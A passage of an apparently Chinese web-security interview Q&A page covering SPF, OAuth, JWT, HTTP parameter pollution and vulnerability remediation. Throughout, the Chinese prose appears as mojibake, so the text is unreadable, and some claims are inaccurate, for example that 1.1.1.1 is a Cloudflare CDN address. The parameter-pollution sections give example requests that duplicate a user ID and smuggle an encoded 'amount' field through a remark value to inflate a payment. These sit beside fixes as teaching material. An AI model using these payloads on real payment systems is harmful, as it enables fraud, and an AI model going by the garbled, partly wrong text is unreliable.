ä½œç”¨ï¼šæŒ‡å®šå…è®¸çš„é‚®ä»¶å‘é€æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¼ªé€ é‚®ä»¶ã€‚"></a><strong>ç¤ºä¾‹</strong>ï¼š<br>- <strong>SPF è®°å½•ï¼ˆTXTï¼‰</strong>ï¼š<br>  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com TXT &quot;v=spf1 ip4:192.168.1.1 -all&quot;</span><br></pre></td></tr></table></figure><br>  ä½œç”¨ï¼šæŒ‡å®šå…è®¸çš„é‚®ä»¶å‘é€æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¼ªé€ é‚®ä»¶ã€‚</h2><h3 id="å°†æš‚æ—¶ä¸ç”¨çš„åŸŸåè§£æåˆ°-1-1-1-1-æœ‰ä»€ä¹ˆå¥½å¤„å’Œåå¤„ï¼Ÿ"><a href="#å°†æš‚æ—¶ä¸ç”¨çš„åŸŸåè§£æåˆ°-1-1-1-1-æœ‰ä»€ä¹ˆå¥½å¤„å’Œåå¤„ï¼Ÿ" class="headerlink" title="å°†æš‚æ—¶ä¸ç”¨çš„åŸŸåè§£æåˆ° 1.1.1.1 æœ‰ä»€ä¹ˆå¥½å¤„å’Œåå¤„ï¼Ÿ"></a><strong>å°†æš‚æ—¶ä¸ç”¨çš„åŸŸåè§£æåˆ° 1.1.1.1 æœ‰ä»€ä¹ˆå¥½å¤„å’Œåå¤„ï¼Ÿ</strong></h3><p><strong>å¥½å¤„</strong>ï¼š</p><ul><li>é¿å…åŸ IP è§£æï¼Œé˜²æ­¢è§£æè®°å½•æš´éœ²ï¼Œå‡å°‘æ”»å‡»é£é™©ã€‚</li><li>åŠ å¿«å…¨çƒè§£æåŒæ­¥é€Ÿåº¦ã€‚</li></ul><p><strong>åå¤„</strong>ï¼š</p><ul><li>1.1.1.1 æ˜¯ Cloudflare CDN çš„ IPï¼Œå¯èƒ½å¯¼è‡´è¯¯å°æˆ–å®‰å…¨é£é™©ã€‚</li><li>å¯èƒ½å½±å“æœªæ¥æ¢å¤ä½¿ç”¨ï¼Œå¯¼è‡´è§£æé—®é¢˜ã€‚</li></ul><h2 id="æ›´å®‰å…¨çš„åšæ³•ï¼š-ç›´æ¥åˆ é™¤åŸŸåè§£æè®°å½•ï¼Œæˆ–è®¾ç½®-NXDOMAIN-å“åº”ã€‚"><a href="#æ›´å®‰å…¨çš„åšæ³•ï¼š-ç›´æ¥åˆ é™¤åŸŸåè§£æè®°å½•ï¼Œæˆ–è®¾ç½®-NXDOMAIN-å“åº”ã€‚" class="headerlink" title="æ›´å®‰å…¨çš„åšæ³•ï¼š- ç›´æ¥åˆ é™¤åŸŸåè§£æè®°å½•ï¼Œæˆ–è®¾ç½® NXDOMAIN å“åº”ã€‚"></a><strong>æ›´å®‰å…¨çš„åšæ³•</strong>ï¼š<br>- ç›´æ¥åˆ é™¤åŸŸåè§£æè®°å½•ï¼Œæˆ–è®¾ç½® <code>NXDOMAIN</code> å“åº”ã€‚</h2><h3 id="OAuth-é™¤äº†-redirect-uri-ç»•è¿‡é—®é¢˜å¤–ï¼Œè¿˜æœ‰å“ªäº›é£é™©ä»¥åŠå¦‚ä½•ä¿®å¤ï¼Ÿ"><a href="#OAuth-é™¤äº†-redirect-uri-ç»•è¿‡é—®é¢˜å¤–ï¼Œè¿˜æœ‰å“ªäº›é£é™©ä»¥åŠå¦‚ä½•ä¿®å¤ï¼Ÿ" class="headerlink" title="OAuth é™¤äº† redirect_uri ç»•è¿‡é—®é¢˜å¤–ï¼Œè¿˜æœ‰å“ªäº›é£é™©ä»¥åŠå¦‚ä½•ä¿®å¤ï¼Ÿ"></a><strong>OAuth é™¤äº† redirect_uri ç»•è¿‡é—®é¢˜å¤–ï¼Œè¿˜æœ‰å“ªäº›é£é™©ä»¥åŠå¦‚ä½•ä¿®å¤ï¼Ÿ</strong></h3><p><strong>å¸¸è§é£é™©</strong>ï¼š</p><ul><li><strong>State å‚æ•°ç¼ºå¤±</strong>ï¼šå¯¼è‡´ CSRF æ”»å‡»ï¼Œæ”»å‡»è€…å¯åŠ«æŒç”¨æˆ·æˆæƒã€‚</li><li><strong>Client Secret æ³„éœ²</strong>ï¼šæ”»å‡»è€…ä¼ªé€ è¯·æ±‚ï¼Œå†’å……åˆæ³•å®¢æˆ·ç«¯è·å–è®¿é—®æƒé™ã€‚</li><li><strong>é”™è¯¯çš„ token å­˜å‚¨</strong>ï¼šè®¿é—®ä»¤ç‰Œè¢«å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œå®¹æ˜“è¢«ç›—ç”¨ã€‚</li></ul><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-å¼ºåˆ¶æ ¡éªŒ-state-å‚æ•°ï¼Œé˜²æ­¢-CSRFï¼š-ä¸¥æ ¼éªŒè¯-redirect-uri-ï¼Œé¿å…é‡å®šå‘åˆ°æ”»å‡»è€…ç«™ç‚¹ï¼š-ä½¿ç”¨çŸ­ç”Ÿå‘½å‘¨æœŸ-Tokenï¼Œé¿å…é•¿æœŸæš´éœ²ï¼š-Access-Token-ä»…å¯ä½¿ç”¨ä¸€æ¬¡-ä½¿ç”¨-Refresh-Token-è¿›è¡Œé•¿æ—¶é—´ä¼šè¯ç»´æŠ¤-å…¨ç¨‹ä½¿ç”¨-HTTPSï¼Œé˜²æ­¢-Token-è¢«çªƒå¬"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-å¼ºåˆ¶æ ¡éªŒ-state-å‚æ•°ï¼Œé˜²æ­¢-CSRFï¼š-ä¸¥æ ¼éªŒè¯-redirect-uri-ï¼Œé¿å…é‡å®šå‘åˆ°æ”»å‡»è€…ç«™ç‚¹ï¼š-ä½¿ç”¨çŸ­ç”Ÿå‘½å‘¨æœŸ-Tokenï¼Œé¿å…é•¿æœŸæš´éœ²ï¼š-Access-Token-ä»…å¯ä½¿ç”¨ä¸€æ¬¡-ä½¿ç”¨-Refresh-Token-è¿›è¡Œé•¿æ—¶é—´ä¼šè¯ç»´æŠ¤-å…¨ç¨‹ä½¿ç”¨-HTTPSï¼Œé˜²æ­¢-Token-è¢«çªƒå¬" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- å¼ºåˆ¶æ ¡éªŒ state å‚æ•°ï¼Œé˜²æ­¢ CSRFï¼š  - **ä¸¥æ ¼éªŒè¯ redirect_uri**ï¼Œé¿å…é‡å®šå‘åˆ°æ”»å‡»è€…ç«™ç‚¹ï¼š  - ä½¿ç”¨çŸ­ç”Ÿå‘½å‘¨æœŸ Tokenï¼Œé¿å…é•¿æœŸæš´éœ²ï¼š  - Access Token ä»…å¯ä½¿ç”¨ä¸€æ¬¡  - ä½¿ç”¨ Refresh Token è¿›è¡Œé•¿æ—¶é—´ä¼šè¯ç»´æŠ¤  - å…¨ç¨‹ä½¿ç”¨ HTTPSï¼Œé˜²æ­¢ Token è¢«çªƒå¬"></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>å¼ºåˆ¶æ ¡éªŒ <code>state</code> å‚æ•°</strong>ï¼Œé˜²æ­¢ CSRFï¼š<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state = generate_secure_token()</span><br><span class="line">session[<span class="string">&quot;oauth_state&quot;</span>] = state</span><br><span class="line">redirect_uri = <span class="string">f&quot;https://auth.com/oauth?state=<span class="subst">&#123;state&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><br>- **ä¸¥æ ¼éªŒè¯ <code>redirect_uri</code>**ï¼Œé¿å…é‡å®šå‘åˆ°æ”»å‡»è€…ç«™ç‚¹ï¼š<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> redirect_uri.startswith(<span class="string">&quot;https://trusted-site.com&quot;</span>):</span><br><span class="line">    abort(<span class="number">403</span>)</span><br></pre></td></tr></table></figure><br>- <strong>ä½¿ç”¨çŸ­ç”Ÿå‘½å‘¨æœŸ Tokenï¼Œé¿å…é•¿æœŸæš´éœ²</strong>ï¼š<br>  - Access Token ä»…å¯ä½¿ç”¨ä¸€æ¬¡<br>  - ä½¿ç”¨ Refresh Token è¿›è¡Œé•¿æ—¶é—´ä¼šè¯ç»´æŠ¤<br>  - å…¨ç¨‹ä½¿ç”¨ HTTPSï¼Œé˜²æ­¢ Token è¢«çªƒå¬</h2><h3 id="JWT-ç›¸è¾ƒäº-SESSION-çš„ä¼˜åŠ¿ï¼Ÿ"><a href="#JWT-ç›¸è¾ƒäº-SESSION-çš„ä¼˜åŠ¿ï¼Ÿ" class="headerlink" title="JWT ç›¸è¾ƒäº SESSION çš„ä¼˜åŠ¿ï¼Ÿ"></a><strong>JWT ç›¸è¾ƒäº SESSION çš„ä¼˜åŠ¿ï¼Ÿ</strong></h3><p><strong>JWT ä¼˜åŠ¿</strong>ï¼š</p><ul><li><strong>æ— çŠ¶æ€</strong>ï¼šJWT ä¸ä¾èµ–æœåŠ¡å™¨å­˜å‚¨ä¼šè¯æ•°æ®ï¼Œé€‚ç”¨äºåˆ†å¸ƒå¼ç³»ç»Ÿã€‚</li><li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šSESSION éœ€è¦å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼Œè€Œ JWT é€šè¿‡å®¢æˆ·ç«¯ä¼ è¾“ï¼Œå‡å°‘äº†æœåŠ¡å™¨è´Ÿæ‹…ã€‚</li><li><strong>å¯æ‰©å±•æ€§</strong>ï¼šJWT å¯æºå¸¦è‡ªå®šä¹‰å£°æ˜ï¼ˆclaimsï¼‰ï¼Œæ”¯æŒå¤šç§èº«ä»½éªŒè¯åœºæ™¯ã€‚</li></ul><h2 id="å®‰å…¨æ³¨æ„ç‚¹ï¼š-JWT-ä¸€æ—¦æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥é•¿æœŸä½¿ç”¨ï¼Œå»ºè®®ä½¿ç”¨çŸ­ç”Ÿå‘½å‘¨æœŸ-Tokenã€‚-éœ€ä½¿ç”¨-RS256ï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰-æˆ–-HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰ï¼Œé¿å…-none-ç®—æ³•æ¼æ´ã€‚"><a href="#å®‰å…¨æ³¨æ„ç‚¹ï¼š-JWT-ä¸€æ—¦æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥é•¿æœŸä½¿ç”¨ï¼Œå»ºè®®ä½¿ç”¨çŸ­ç”Ÿå‘½å‘¨æœŸ-Tokenã€‚-éœ€ä½¿ç”¨-RS256ï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰-æˆ–-HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰ï¼Œé¿å…-none-ç®—æ³•æ¼æ´ã€‚" class="headerlink" title="å®‰å…¨æ³¨æ„ç‚¹ï¼š- JWT ä¸€æ—¦æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥é•¿æœŸä½¿ç”¨ï¼Œå»ºè®®ä½¿ç”¨çŸ­ç”Ÿå‘½å‘¨æœŸ Tokenã€‚- éœ€ä½¿ç”¨ RS256ï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰ æˆ– HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰ï¼Œé¿å… none ç®—æ³•æ¼æ´ã€‚"></a><strong>å®‰å…¨æ³¨æ„ç‚¹</strong>ï¼š<br>- JWT ä¸€æ—¦æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥é•¿æœŸä½¿ç”¨ï¼Œå»ºè®®ä½¿ç”¨çŸ­ç”Ÿå‘½å‘¨æœŸ Tokenã€‚<br>- éœ€ä½¿ç”¨ <strong>RS256ï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰</strong> æˆ– <strong>HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰</strong>ï¼Œé¿å… <code>none</code> ç®—æ³•æ¼æ´ã€‚</h2><h3 id="å¦‚ä½•é€šè¿‡-HTTP-å‚æ•°æ±¡æŸ“å°†-uid-9527-amount-100-ä¸­çš„-uid-æ”¹ä¸º-10086ï¼Ÿ"><a href="#å¦‚ä½•é€šè¿‡-HTTP-å‚æ•°æ±¡æŸ“å°†-uid-9527-amount-100-ä¸­çš„-uid-æ”¹ä¸º-10086ï¼Ÿ" class="headerlink" title="å¦‚ä½•é€šè¿‡ HTTP å‚æ•°æ±¡æŸ“å°† uid=9527&amp;amount=100 ä¸­çš„ uid æ”¹ä¸º 10086ï¼Ÿ"></a><strong>å¦‚ä½•é€šè¿‡ HTTP å‚æ•°æ±¡æŸ“å°† <code>uid=9527&amp;amount=100</code> ä¸­çš„ uid æ”¹ä¸º 10086ï¼Ÿ</strong></h3><p><strong>æ¼æ´åŸç†</strong>ï¼š<br>HTTP å‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰æ˜¯æŒ‡é€šè¿‡é‡å¤æäº¤ç›¸åŒå‚æ•°ï¼Œå¯¼è‡´æœåŠ¡å™¨åœ¨è§£ææ—¶å‡ºç°ä¸ä¸€è‡´ï¼Œä»è€Œå®ç°æ”»å‡»ã€‚</p><p><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š</p><ul><li><p><strong>æœåŠ¡å™¨å¤„ç†å‚æ•°æ–¹å¼ä¸åŒ</strong>ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /transfer?uid=9527&amp;uid=10086&amp;amount=100</span><br></pre></td></tr></table></figure><ul><li>æŸäº›æœåŠ¡å™¨å–<strong>ç¬¬ä¸€ä¸ªå‚æ•°</strong>ï¼ˆ<code>uid=9527</code>ï¼‰</li><li>æŸäº›æœåŠ¡å™¨å–<strong>æœ€åä¸€ä¸ªå‚æ•°</strong>ï¼ˆ<code>uid=10086</code>ï¼‰</li></ul></li><li><p><strong>ç¼–ç ç»•è¿‡</strong>ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /transfer?uid=9527%26uid%3D10086&amp;amount=100</span><br></pre></td></tr></table></figure><ul><li><code>%26</code> æ˜¯ <code>&amp;</code> çš„ URL ç¼–ç ï¼Œå¯¼è‡´ <code>uid=9527&amp;uid=10086</code> è¢«è§£æã€‚</li></ul></li></ul><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-ä¸¥æ ¼é™åˆ¶å‚æ•°æ ¼å¼ï¼Œæ‹’ç»é‡å¤å‚æ•°ã€‚-ç»Ÿä¸€æœåŠ¡å™¨ç«¯å‚æ•°è§£ææ–¹å¼ï¼Œç¡®ä¿å‚æ•°å”¯ä¸€æ€§ã€‚"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-ä¸¥æ ¼é™åˆ¶å‚æ•°æ ¼å¼ï¼Œæ‹’ç»é‡å¤å‚æ•°ã€‚-ç»Ÿä¸€æœåŠ¡å™¨ç«¯å‚æ•°è§£ææ–¹å¼ï¼Œç¡®ä¿å‚æ•°å”¯ä¸€æ€§ã€‚" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- ä¸¥æ ¼é™åˆ¶å‚æ•°æ ¼å¼ï¼Œæ‹’ç»é‡å¤å‚æ•°ã€‚- ç»Ÿä¸€æœåŠ¡å™¨ç«¯å‚æ•°è§£ææ–¹å¼ï¼Œç¡®ä¿å‚æ•°å”¯ä¸€æ€§ã€‚"></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- ä¸¥æ ¼é™åˆ¶å‚æ•°æ ¼å¼ï¼Œæ‹’ç»é‡å¤å‚æ•°ã€‚<br>- ç»Ÿä¸€æœåŠ¡å™¨ç«¯å‚æ•°è§£ææ–¹å¼ï¼Œç¡®ä¿å‚æ•°å”¯ä¸€æ€§ã€‚</h2><h3 id="å½“ç½‘å…³å¯¹æ‰€æœ‰è¯·æ±‚ä¼šè¿›è¡Œä¸€æ¬¡å¼ºåˆ¶-urldecodeï¼Œå­˜åœ¨ä¸€ä¸ªå‚æ•°-uid-9527-remark-å……è¯è´¹-amount-100-çš„æ¥å£ï¼Œä»…å¤‡æ³¨å­—æ®µï¼ˆremarkï¼‰å¯æ§æ—¶ï¼Œå¦‚ä½•æ”¹å˜æœ€ç»ˆçš„é‡‘é¢å­—æ®µï¼ˆamountï¼‰ï¼Ÿ"><a href="#å½“ç½‘å…³å¯¹æ‰€æœ‰è¯·æ±‚ä¼šè¿›è¡Œä¸€æ¬¡å¼ºåˆ¶-urldecodeï¼Œå­˜åœ¨ä¸€ä¸ªå‚æ•°-uid-9527-remark-å……è¯è´¹-amount-100-çš„æ¥å£ï¼Œä»…å¤‡æ³¨å­—æ®µï¼ˆremarkï¼‰å¯æ§æ—¶ï¼Œå¦‚ä½•æ”¹å˜æœ€ç»ˆçš„é‡‘é¢å­—æ®µï¼ˆamountï¼‰ï¼Ÿ" class="headerlink" title="å½“ç½‘å…³å¯¹æ‰€æœ‰è¯·æ±‚ä¼šè¿›è¡Œä¸€æ¬¡å¼ºåˆ¶ urldecodeï¼Œå­˜åœ¨ä¸€ä¸ªå‚æ•° uid=9527&amp;remark=å……è¯è´¹&amp;amount=100 çš„æ¥å£ï¼Œä»…å¤‡æ³¨å­—æ®µï¼ˆremarkï¼‰å¯æ§æ—¶ï¼Œå¦‚ä½•æ”¹å˜æœ€ç»ˆçš„é‡‘é¢å­—æ®µï¼ˆamountï¼‰ï¼Ÿ"></a><strong>å½“ç½‘å…³å¯¹æ‰€æœ‰è¯·æ±‚ä¼šè¿›è¡Œä¸€æ¬¡å¼ºåˆ¶ urldecodeï¼Œå­˜åœ¨ä¸€ä¸ªå‚æ•° <code>uid=9527&amp;remark=å……è¯è´¹&amp;amount=100</code> çš„æ¥å£ï¼Œä»…å¤‡æ³¨å­—æ®µï¼ˆremarkï¼‰å¯æ§æ—¶ï¼Œå¦‚ä½•æ”¹å˜æœ€ç»ˆçš„é‡‘é¢å­—æ®µï¼ˆamountï¼‰ï¼Ÿ</strong></h3><p><strong>æ¼æ´åŸç†</strong>ï¼š<br>å¦‚æœç½‘å…³ä¼šå¼ºåˆ¶ <code>urldecode</code>ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ <code>%26</code>ï¼ˆå³ <code>&amp;</code>ï¼‰æˆ– <code>%3D</code>ï¼ˆå³ <code>=</code>ï¼‰è¿›è¡Œè§£æç»•è¿‡ï¼Œç¯¡æ”¹ <code>amount</code>ã€‚</p><p><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>GET &#x2F;pay?uid&#x3D;9527&amp;remark&#x3D;å……è¯è´¹%26amount%3D100000<br>å¦‚æœæœåŠ¡å™¨åœ¨ <code>urldecode</code> åå¤„ç†ï¼š<br>uid&#x3D;9527&amp;remark&#x3D;å……è¯è´¹&amp;amount&#x3D;100000<br>æ­¤æ—¶ <code>amount</code> è¢«æˆåŠŸä¿®æ”¹ä¸º 100000ã€‚</p><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-å¯¹è¾“å…¥æ•°æ®è¿›è¡ŒäºŒæ¬¡ç¼–ç æ£€æŸ¥ï¼Œé¿å…-urldecode-è§£æå‚æ•°ã€‚-ä½¿ç”¨-JSON-ä¼ è¾“æ•°æ®ï¼Œé¿å…-query-string-å‚æ•°è§£æé—®é¢˜ã€‚"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-å¯¹è¾“å…¥æ•°æ®è¿›è¡ŒäºŒæ¬¡ç¼–ç æ£€æŸ¥ï¼Œé¿å…-urldecode-è§£æå‚æ•°ã€‚-ä½¿ç”¨-JSON-ä¼ è¾“æ•°æ®ï¼Œé¿å…-query-string-å‚æ•°è§£æé—®é¢˜ã€‚" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- å¯¹è¾“å…¥æ•°æ®è¿›è¡ŒäºŒæ¬¡ç¼–ç æ£€æŸ¥ï¼Œé¿å… urldecode è§£æå‚æ•°ã€‚- ä½¿ç”¨ JSON ä¼ è¾“æ•°æ®ï¼Œé¿å… query string å‚æ•°è§£æé—®é¢˜ã€‚"></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>å¯¹è¾“å…¥æ•°æ®è¿›è¡ŒäºŒæ¬¡ç¼–ç æ£€æŸ¥</strong>ï¼Œé¿å… <code>urldecode</code> è§£æå‚æ•°ã€‚<br>- <strong>ä½¿ç”¨ JSON ä¼ è¾“æ•°æ®</strong>ï¼Œé¿å… <code>query string</code> å‚æ•°è§£æé—®é¢˜ã€‚</h2><h3 id="å“ªäº›æ¼æ´çš„æµ‹è¯•å¯¹ä¸šåŠ¡æœ‰æŸï¼Ÿå¦‚ä½•é¿å…ï¼Ÿ"><a href="#å“ªäº›æ¼æ´çš„æµ‹è¯•å¯¹ä¸šåŠ¡æœ‰æŸï¼Ÿå¦‚ä½•é¿å…ï¼Ÿ" class="headerlink" title="å“ªäº›æ¼æ´çš„æµ‹è¯•å¯¹ä¸šåŠ¡æœ‰æŸï¼Ÿå¦‚ä½•é¿å…ï¼Ÿ"></a><strong>å“ªäº›æ¼æ´çš„æµ‹è¯•å¯¹ä¸šåŠ¡æœ‰æŸï¼Ÿå¦‚ä½•é¿å…ï¼Ÿ</strong></h3><p><strong>é«˜é£é™©æµ‹è¯•</strong>ï¼š</p><ul><li><strong>SQL æ³¨å…¥</strong>ï¼šå¯èƒ½å¯¼è‡´æ•°æ®åº“å´©æºƒã€‚</li><li><strong>CSRF æµ‹è¯•</strong>ï¼šå¯èƒ½å¯¼è‡´ç”¨æˆ·è¯¯æ“ä½œã€‚</li><li><strong>é€»è¾‘æ¼æ´</strong>ï¼šæ‰¹é‡åˆ·å•ã€æ”¯ä»˜ç»•è¿‡ç­‰æµ‹è¯•å¯èƒ½å½±å“ä¸šåŠ¡æ•°æ®ã€‚</li></ul><h2 id="é¿å…æ–¹æ¡ˆï¼š-åœ¨-æµ‹è¯•ç¯å¢ƒ-è¿›è¡ŒéªŒè¯ï¼Œé¿å…ç›´æ¥åœ¨ç”Ÿäº§ç¯å¢ƒæµ‹è¯•ã€‚-å¯¹å…³é”®-API-é™åˆ¶é«˜é¢‘è¯·æ±‚ï¼Œé˜²æ­¢å½±å“ç”¨æˆ·ä½“éªŒã€‚"><a href="#é¿å…æ–¹æ¡ˆï¼š-åœ¨-æµ‹è¯•ç¯å¢ƒ-è¿›è¡ŒéªŒè¯ï¼Œé¿å…ç›´æ¥åœ¨ç”Ÿäº§ç¯å¢ƒæµ‹è¯•ã€‚-å¯¹å…³é”®-API-é™åˆ¶é«˜é¢‘è¯·æ±‚ï¼Œé˜²æ­¢å½±å“ç”¨æˆ·ä½“éªŒã€‚" class="headerlink" title="é¿å…æ–¹æ¡ˆï¼š- åœ¨ æµ‹è¯•ç¯å¢ƒ è¿›è¡ŒéªŒè¯ï¼Œé¿å…ç›´æ¥åœ¨ç”Ÿäº§ç¯å¢ƒæµ‹è¯•ã€‚- å¯¹å…³é”® API é™åˆ¶é«˜é¢‘è¯·æ±‚ï¼Œé˜²æ­¢å½±å“ç”¨æˆ·ä½“éªŒã€‚"></a><strong>é¿å…æ–¹æ¡ˆ</strong>ï¼š<br>- åœ¨ <strong>æµ‹è¯•ç¯å¢ƒ</strong> è¿›è¡ŒéªŒè¯ï¼Œé¿å…ç›´æ¥åœ¨ç”Ÿäº§ç¯å¢ƒæµ‹è¯•ã€‚<br>- å¯¹å…³é”® API é™åˆ¶é«˜é¢‘è¯·æ±‚ï¼Œé˜²æ­¢å½±å“ç”¨æˆ·ä½“éªŒã€‚</h2><h3 id="æ¼æ´ä¿®å¤ä¸€èˆ¬åˆ†ä¸ºå“ªå‡ ä¸ªæ­¥éª¤ï¼Ÿ"><a href="#æ¼æ´ä¿®å¤ä¸€èˆ¬åˆ†ä¸ºå“ªå‡ ä¸ªæ­¥éª¤ï¼Ÿ" class="headerlink" title="æ¼æ´ä¿®å¤ä¸€èˆ¬åˆ†ä¸ºå“ªå‡ ä¸ªæ­¥éª¤ï¼Ÿ"></a><strong>æ¼æ´ä¿®å¤ä¸€èˆ¬åˆ†ä¸ºå“ªå‡ ä¸ªæ­¥éª¤ï¼Ÿ</strong></h3><ol><li><strong>æ¼æ´ç¡®è®¤</strong>ï¼šåˆ†ææ¼æ´æ˜¯å¦çœŸå®å­˜åœ¨ã€‚</li><li><strong>é£é™©è¯„ä¼°</strong>ï¼šç¡®å®šæ¼æ´çš„å½±å“èŒƒå›´å’Œç´§æ€¥ç¨‹åº¦ã€‚</li><li><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼šåˆ¶å®šä¿®å¤æ–¹æ¡ˆï¼Œå¯èƒ½åŒ…æ‹¬ä»£ç ä¿®å¤ã€é…ç½®è°ƒæ•´ç­‰ã€‚</li><li><strong>ä¿®å¤éªŒè¯</strong>ï¼šæµ‹è¯•ä¿®å¤æ˜¯å¦ç”Ÿæ•ˆï¼Œç¡®ä¿æ— æ–°é—®é¢˜å¼•å…¥ã€‚</li></ol><hr><h3 id="å¦‚ä½•åˆ¶å®šæ¼æ´çš„ä¿®å¤æ—¶é—´ï¼Ÿéœ€è¦è€ƒè™‘å“ªäº›å› ç´ ï¼Ÿ"><a href="#å¦‚ä½•åˆ¶å®šæ¼æ´çš„ä¿®å¤æ—¶é—´ï¼Ÿéœ€è¦è€ƒè™‘å“ªäº›å› ç´ ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ¶å®šæ¼æ´çš„ä¿®å¤æ—¶é—´ï¼Ÿéœ€è¦è€ƒè™‘å“ªäº›å› ç´ ï¼Ÿ"></a><strong>å¦‚ä½•åˆ¶å®šæ¼æ´çš„ä¿®å¤æ—¶é—´ï¼Ÿéœ€è¦è€ƒè™‘å“ªäº›å› ç´ ï¼Ÿ</strong></h3><p><strong>å…³é”®è€ƒè™‘å› ç´ </strong>ï¼š</p><ul><li><strong>æ¼æ´ä¸¥é‡åº¦</strong>ï¼ˆé«˜å±æ¼æ´éœ€ç«‹å³ä¿®å¤ï¼‰ã€‚</li><li><strong>ä¸šåŠ¡å½±å“</strong>ï¼ˆé¿å…ä¿®å¤å½±å“æ ¸å¿ƒä¸šåŠ¡ï¼‰ã€‚</li><li><strong>ä¿®å¤æˆæœ¬</strong>ï¼ˆä»£ç æ”¹åŠ¨ã€æµ‹è¯•èµ„æºï¼‰ã€‚</li></ul><h2 id="æœ€ä½³å®è·µï¼š-P0ï¼ˆé«˜å±ï¼‰ï¼š24-å°æ—¶å†…ä¿®å¤ã€‚-P1ï¼ˆä¸­å±ï¼‰ï¼š1-å‘¨å†…ä¿®å¤ã€‚-P2ï¼ˆä½å±ï¼‰ï¼š1-ä¸ªæœˆå†…ä¿®å¤ã€‚"><a href="#æœ€ä½³å®è·µï¼š-P0ï¼ˆé«˜å±ï¼‰ï¼š24-å°æ—¶å†…ä¿®å¤ã€‚-P1ï¼ˆä¸­å±ï¼‰ï¼š1-å‘¨å†…ä¿®å¤ã€‚-P2ï¼ˆä½å±ï¼‰ï¼š1-ä¸ªæœˆå†…ä¿®å¤ã€‚" class="headerlink" title="æœ€ä½³å®è·µï¼š- P0ï¼ˆé«˜å±ï¼‰ï¼š24 å°æ—¶å†…ä¿®å¤ã€‚- P1ï¼ˆä¸­å±ï¼‰ï¼š1 å‘¨å†…ä¿®å¤ã€‚- P2ï¼ˆä½å±ï¼‰ï¼š1 ä¸ªæœˆå†…ä¿®å¤ã€‚"></a><strong>æœ€ä½³å®è·µ</strong>ï¼š<br>- <strong>P0ï¼ˆé«˜å±ï¼‰</strong>ï¼š24 å°æ—¶å†…ä¿®å¤ã€‚<br>- <strong>P1ï¼ˆä¸­å±ï¼‰</strong>ï¼š1 å‘¨å†…ä¿®å¤ã€‚<br>- <strong>P2ï¼ˆä½å±ï¼‰</strong>ï¼š1 ä¸ªæœˆå†…ä¿®å¤ã€‚</h2><h3 id="å¦‚ä½•æœ‰æ•ˆæå‡æ¼æ´ä¿®å¤æ•ˆç‡ï¼Ÿ"><a href="#å¦‚ä½•æœ‰æ•ˆæå‡æ¼æ´ä¿®å¤æ•ˆç‡ï¼Ÿ" class="headerlink" title="å¦‚ä½•æœ‰æ•ˆæå‡æ¼æ´ä¿®å¤æ•ˆç‡ï¼Ÿ"></a><strong>å¦‚ä½•æœ‰æ•ˆæå‡æ¼æ´ä¿®å¤æ•ˆç‡ï¼Ÿ</strong></h3><h2 id="ä¼˜åŒ–æ–¹æ³•ï¼š-æ¼æ´åˆ†ç±»ï¼Œåˆ¶å®šæ ‡å‡†åŒ–ä¿®å¤æµç¨‹ã€‚-è‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œå‡å°‘å›å½’æµ‹è¯•æˆæœ¬ã€‚-å¼€å‘å®‰å…¨åŸ¹è®­ï¼Œæé«˜ä¿®å¤èƒ½åŠ›ã€‚"><a href="#ä¼˜åŒ–æ–¹æ³•ï¼š-æ¼æ´åˆ†ç±»ï¼Œåˆ¶å®šæ ‡å‡†åŒ–ä¿®å¤æµç¨‹ã€‚-è‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œå‡å°‘å›å½’æµ‹è¯•æˆæœ¬ã€‚-å¼€å‘å®‰å…¨åŸ¹è®­ï¼Œæé«˜ä¿®å¤èƒ½åŠ›ã€‚" class="headerlink" title="ä¼˜åŒ–æ–¹æ³•ï¼š- 